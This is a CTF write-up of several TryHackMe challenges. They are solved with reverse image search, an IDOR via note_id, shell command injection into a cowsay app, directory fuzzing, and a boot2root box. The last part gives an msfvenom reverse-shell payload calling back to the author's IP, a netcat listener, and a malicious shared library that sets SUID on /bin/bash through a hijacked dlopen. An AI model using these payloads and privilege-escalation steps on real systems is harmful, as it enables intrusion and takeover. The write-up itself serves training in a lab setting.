# MEMSEC x TryHackMe: CTF - Writeup
- Note: I censor my IP with <MY_IP> and target's IP with <TARGET_IP>
- Note: Everything is run on my local VM
## OSINT: TryFindMe - 60 PTS
```
CHALLENGE BRIEF - EASY
01 // MISSION
Can you find where this photo was taken?
**Answer format: No capital letters, underscore to separate words, and wrapped in THM{}.**
**For example, If the beach is Venice Beach, the answer would be THM{venice_beach}**
```
![[surfsup-1793737367434.jpg]]

### What's the flag? [30 pts]
**Answer:** THM{jeffreys_bay}

### What I did:
- Use google reverse image search.
- See that it is Supertubes in Jeffreys Bay, South Africa

___

## WEB: Notepad Online - 60 PTS
```
CHALLENGE BRIEF - EASY
01 // MISSION
Thank you for registering for the Online Notepad Service. Your assigned credentials are as follows: User: noel Pass: pass1234 Our services are built with security in mind. Rest assured that your notes will only be visible to you and nobody else.
App: http://MACHINE_IP/
```

### What is the flag? [60 pts]
**Answer:** THM{i_can_see_your_notes}
### What I did:
- Landed at `/note.php?note_id=1`
- Change it to 2,3,4,5 and see that it display others' notes
- On `note_id=5`, see "Hint: Do note_ids start from 1? Maybe go lower ;)"
- Go to `/note.php?note_id=0` and get the flag

___

## WEB: What Does the Cow Say? - 60 PTS
```
CHALLENGE BRIEF - EASY
01 // MISSION
Hey look. I've made my first PHP application. I bet you can't hack into it. Click the green Start Machine button, and wait 1-2 minutes for the target machine to start.
App: http://MACHINE_IP/
```

### What is the flag? [60 pts]
**Answer:** THM{web_is_my_cmdline}
### What I did:
- See "Powered by cowsay!"
- And `cowsay` is a pretty famous, classic Linux terminal utility that generates ASCII art of a cow saying something.
- Do `test; ls -la`
- See the flag file `flag-908232983749863958729.txt`
- Do `test; cat flag-908232983749863958729.txt` and get the flag

___

## WEB: Endpoint - 60 PTS
```
CHALLENGE BRIEF - EASY
01 // MISSION
You’ve been summoned to investigate a mysterious web application that has recently come under scrutiny. Rumors circulate about hidden messages and secrets concealed within the app’s architecture. As a seasoned investigator, your mission is to navigate the web application, searching for clues embedded in its responses.
Start the machine and visit http://MACHINE_IP/ to begin the challenge.
```
### Whats it the flag? [60 pts]
**Answer:** THM{fuzz1ng_4dv3ntur3}
### What I did:
- See the page being blank
- Run `feroxbuster -u http://<TARGET_IP> -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php,txt,html`
- Found http://<TARGET_IP>/source/flag.txt

___
## BOOT2ROOT: Malscan - 90 PTS
```
CHALLENGE BRIEF - MEDIUM
01 // MISSION
Welcome to Malscan, a malware-analysis sandbox built by a software company's development team for internal use. The team recently deployed an isolated environment with a prototype endpoint that lets analysts upload suspicious binaries and detonate them in a virtualised sandbox. Each uploaded file is automatically executed to generate a behavioural report. Unfortunately, the lab was rushed into production with minimal security review. Your goal is to assess the exposed dev environment, understand how files are handled, and uncover any unsafe assumptions in the scan pipeline.
Target: MACHINE_IP
```

### Flags
What is the value of the user flag? [45 pts]
**Answer:** THM{almost_d0n3-keep_it_g01ng}

What is the value of the root flag? [45 pts]
**Answer:** THM{y0u_d1d_th1s_congrats}
### **What I did:**
- See a place to upload binary file at /dev/upload.php
- Create a malicious payload (ELF binary) on my local attack machine `msfvenom -p linux/x64/shell_reverse_tcp LHOST=<MY_IP> LPORT=4444 -f elf -o shell`
- Start a listener `nc -lvnp 4444`
- Upload `shell` and submit
- Get connection back at my netcat listener
- Stabilize shell
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```
#### User Flag
- Find user flag `find / -name "user.txt" 2>/dev/null`
- Found `/opt/user.txt`
- Read it `cat /opt/user.txt` and found the flag
#### Root Flag
- Check `sudo -l`, nothing
- Since user flag is in `/opt`, check to see if there is any other interesting thing `ls -la /opt/`
- See `agent` and `user.txt`
- Try `ls -la /opt/agent` and see `-rwsr-xr-x 1 root root 16448 May 15  2025 scanner`
- Try `file /opt/agent/scanner` and see `setuid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked [...]`
- I also tried this on another terminal tab to see if there is any other intersting SUID `find / -perm -4000 -type f 2>/dev/null` (basic privesc checks since I am just www-data and need to escalate), and also see `/opt/agent/scanner`. The rest of the results were all normal system tools every Linux box has but that is not a standard Linux binary. 
- Custom SUID binaries are far more likely to have bugs, so I tried to exploit its root level power to escalate.
- Try to run `/opt/agent/scanner`
- See `dlopen error: /opt/agent/libscan.so: cannot open shared object file: No such file or directory`
- It is trying to `dlopen("/opt/agent/libscan.so")` but the file does not exist.
- Test if gcc is available `which gcc cc` and see that it is available
- Try to write
```
cat << 'EOF' > /opt/agent/libscan.c
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void init() {
    setuid(0);
    setgid(0);
    system("chmod u+s /bin/bash");
}
EOF
```
- Compile `gcc -shared -fPIC -o /opt/agent/libscan.so /opt/agent/libscan.c` and see
```
gcc -shared -fPIC -o /opt/agent/libscan.so /opt/agent/libscan.c/opt/agent/scanner
gcc: fatal error: ‘-fuse-linker-plugin’, but liblto_plugin.so not found
compilation terminated.
```
- So the target doesn’t have a full compiler toolchain
- So, create that file on my local VM `nvim libscan.c`
```
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void init() {
    setuid(0);
    setgid(0);
    system("chmod u+s /bin/bash");
}
```
- Compile `gcc -shared -fPIC -o libscan.so libscan.c`
- Share on my VM `python3 -m http.server 8000`
- Get on target machine `cd /opt/agent && wget http://<MY_IP>:8000/libscan.so`
- Try to run `/opt/agent/scanner`. See `dlopen error: /opt/agent/libscan.so: cannot open shared object file: No such file or directory`
- Check `file /opt/agent/libscan.so`. See `ELF 64-bit LSB shared object, ARM aarch64 [...]`
- See what is wrong. My local machine is Mac, which is ARM (aarch64), but the target is Linux x86-64
- Cross-compile with gcc `x86_64-linux-gnu-gcc -shared -fPIC -o libscan.so libscan.c` targeting x86-64
- Share on local and get on target machine again
- Run again and see `dlsym error: /opt/agent/libscan.so: undefined symbol: run`
- But dlopen succeeded (constructor ran). scanner also calls dlsym("run") afterward, which gives the error
- My payload is already successfully executed during the dlopen
- Verify `ls -la /bin/bash` and see `-rwsr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash`
- Get root shell `/bin/bash -p`
- Check `id` and see `uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)`
- Sucessfully get root
- `cat /root/root.txt` and get the flag










